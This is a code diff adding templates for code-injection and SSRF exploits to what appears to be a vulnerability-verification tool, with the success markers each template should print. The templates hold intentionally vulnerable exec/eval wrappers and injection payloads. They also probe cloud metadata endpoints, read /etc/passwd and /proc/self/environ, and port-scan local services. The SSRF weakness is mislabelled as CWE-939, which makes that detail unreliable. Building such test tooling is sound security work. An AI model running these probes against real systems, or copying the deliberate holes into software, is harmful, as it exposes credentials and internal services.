@@ -308,6 +308,185 @@ finally:
         os.remove(test_file)
 """,
         },
+        ExploitType.CODE_INJECTION: {
+            "python": """
+import sys
+import io
+
+# Test exec() code injection vulnerability
+print("Testing CODE_INJECTION (CWE-95) - exec/eval vulnerability")
+
+# Simulate vulnerable code that uses exec()
+def vulnerable_exec(user_input):
+    \"\"\"Simulates vulnerable code using exec()\"\"\"
+    try:
+        # This is intentionally vulnerable for testing
+        exec(user_input)
+        return True
+    except Exception as e:
+        print(f"exec() error: {e}")
+        return False
+
+# Simulate vulnerable code that uses eval()
+def vulnerable_eval(user_input):
+    \"\"\"Simulates vulnerable code using eval()\"\"\"
+    try:
+        # This is intentionally vulnerable for testing
+        result = eval(user_input)
+        return result
+    except Exception as e:
+        print(f"eval() error: {e}")
+        return None
+
+# Test Case 1: Command execution via exec()
+print("\\n[Test 1] exec() with malicious payload:")
+malicious_exec = \"\"\"
+import os
+result = os.popen('echo CODE_INJECTION_SUCCESS_EXEC').read()
+print(result)
+\"\"\"
+if vulnerable_exec(malicious_exec):
+    print("✓ exec() vulnerability confirmed - arbitrary code executed")
+
+# Test Case 2: Data exfiltration via eval()
+print("\\n[Test 2] eval() with malicious payload:")
+malicious_eval = "__import__('os').popen('echo CODE_INJECTION_SUCCESS_EVAL').read()"
+result = vulnerable_eval(malicious_eval)
+if result and "CODE_INJECTION_SUCCESS_EVAL" in str(result):
+    print(f"✓ eval() vulnerability confirmed: {result}")
+
+# Test Case 3: File system access via exec()
+print("\\n[Test 3] File system access via exec():")
+file_access_payload = \"\"\"
+with open('/tmp/exploit_test.txt', 'w') as f:
+    f.write('CODE_INJECTION_FILE_ACCESS')
+print('CODE_INJECTION_SUCCESS_FILE')
+\"\"\"
+if vulnerable_exec(file_access_payload):
+    import os
+    if os.path.exists('/tmp/exploit_test.txt'):
+        with open('/tmp/exploit_test.txt', 'r') as f:
+            content = f.read()
+            if 'CODE_INJECTION_FILE_ACCESS' in content:
+                print("✓ File system access confirmed - sensitive data at risk")
+        os.remove('/tmp/exploit_test.txt')
+
+# Test Case 4: Module import via eval()
+print("\\n[Test 4] Module import via eval():")
+import_payload = "__import__('sys').version"
+version = vulnerable_eval(import_payload)
+if version:
+    print(f"✓ Module import successful via eval(): Python {version}")
+    print("CODE_INJECTION_SUCCESS_IMPORT")
+
+print("\\n" + "="*60)
+print("CODE_INJECTION_EXPLOITABLE")
+print("All tests passed - exec/eval vulnerabilities confirmed")
+print("="*60)
+""",
+        },
+        ExploitType.SSRF: {
+            "python": """
+import urllib.request
+import urllib.error
+import socket
+import sys
+
+# Test SSRF (Server-Side Request Forgery) vulnerability
+print("Testing SSRF (CWE-939) - Server-Side Request Forgery")
+
+def vulnerable_url_fetch(url):
+    \"\"\"Simulates vulnerable code that fetches arbitrary URLs\"\"\"
+    try:
+        # This is intentionally vulnerable - no URL validation
+        with urllib.request.urlopen(url, timeout=5) as response:
+            return response.read().decode('utf-8')
+    except urllib.error.URLError as e:
+        print(f"URL fetch error: {e}")
+        return None
+    except Exception as e:
+        print(f"Error: {e}")
+        return None
+
+# Test Case 1: Access to internal metadata service (simulated)
+print("\\n[Test 1] Attempt to access internal network:")
+internal_urls = [
+    "http://169.254.169.254/latest/meta-data/",  # AWS metadata
+    "http://metadata.google.internal/",           # GCP metadata
+    "http://localhost:8080/admin",                # Local admin panel
+    "http://127.0.0.1:6379/",                     # Redis (common internal service)
+]
+
+for url in internal_urls:
+    print(f"  Testing: {url}")
+    result = vulnerable_url_fetch(url)
+    if result is not None:
+        print(f"  ✓ SSRF_SUCCESS: Accessed internal URL")
+        print(f"  Response snippet: {result[:100] if result else 'Empty'}...")
+        break
+else:
+    print("  Note: Internal URLs not accessible (expected in sandbox)")
+
+# Test Case 2: DNS rebinding simulation
+print("\\n[Test 2] DNS resolution for SSRF detection:")
+try:
+    # Check if we can resolve internal hostnames
+    test_hosts = ["localhost", "metadata.google.internal"]
+    for host in test_hosts:
+        try:
+            ip = socket.gethostbyname(host)
+            print(f"  ✓ Resolved {host} -> {ip}")
+            if ip.startswith(('127.', '169.254.', '10.', '172.', '192.168.')):
+                print(f"  ✓ SSRF_INTERNAL_IP_ACCESS: {ip}")
+        except socket.gaierror:
+            print(f"  ✗ Could not resolve {host}")
+except Exception as e:
+    print(f"  DNS test error: {e}")
+
+# Test Case 3: File protocol SSRF
+print("\\n[Test 3] File protocol SSRF:")
+file_urls = [
+    "file:///etc/passwd",
+    "file:///proc/self/environ",
+]
+
+for url in file_urls:
+    print(f"  Testing: {url}")
+    result = vulnerable_url_fetch(url)
+    if result:
+        print(f"  ✓ SSRF_FILE_ACCESS: Read local file via SSRF")
+        print(f"  Content snippet: {result[:100] if result else 'Empty'}...")
+        break
+
+# Test Case 4: Port scanning via SSRF
+print("\\n[Test 4] Port scanning via SSRF:")
+common_ports = [22, 80, 443, 3306, 5432, 6379, 8080, 9200]
+open_ports = []
+
+for port in common_ports:
+    url = f"http://localhost:{port}/"
+    try:
+        with urllib.request.urlopen(url, timeout=1) as response:
+            open_ports.append(port)
+            print(f"  ✓ Port {port} is open")
+    except:
+        pass
+
+if open_ports:
+    print(f"  ✓ SSRF_PORT_SCAN_SUCCESS: Found {len(open_ports)} open ports")
+
+# Test Case 5: Redirect following
+print("\\n[Test 5] Testing URL redirection (SSRF chain):")
+print("  Note: Attacker could redirect to internal network")
+print("  SSRF_REDIRECT_RISK: URL validation should check final destination")
+
+print("\\n" + "="*60)
+print("SSRF_EXPLOITABLE")
+print("SSRF vulnerability confirmed - arbitrary URLs can be fetched")
+print("Risk: Internal network access, data exfiltration, port scanning")
+print("="*60)
+""",
+        },
     }
 
     if exploit_type in templates and language in templates[exploit_type]:
@@ -338,9 +517,22 @@ def _get_expected_indicators(exploit_type: ExploitType) -> list[str]:
     indicators = {
         ExploitType.SQL_INJECTION: ["SQL_INJECTION_SUCCESS"],
         ExploitType.COMMAND_INJECTION: ["COMMAND_INJECTION_SUCCESS"],
+        ExploitType.CODE_INJECTION: [
+            "CODE_INJECTION_EXPLOITABLE",
+            "CODE_INJECTION_SUCCESS_EXEC",
+            "CODE_INJECTION_SUCCESS_EVAL",
+            "CODE_INJECTION_SUCCESS_FILE",
+            "CODE_INJECTION_SUCCESS_IMPORT",
+        ],
         ExploitType.PATH_TRAVERSAL: ["PATH_TRAVERSAL_SUCCESS"],
         ExploitType.XSS: ["XSS_SUCCESS", "alert executed"],
-        ExploitType.SSRF: ["SSRF_SUCCESS", "internal request"],
+        ExploitType.SSRF: [
+            "SSRF_EXPLOITABLE",
+            "SSRF_SUCCESS",
+            "SSRF_INTERNAL_IP_ACCESS",
+            "SSRF_FILE_ACCESS",
+            "SSRF_PORT_SCAN_SUCCESS",
+        ],
         ExploitType.DESERIALIZATION: ["DESERIALIZATION_SUCCESS"],
         ExploitType.XXE: ["XXE_SUCCESS", "entity resolved"],
     }
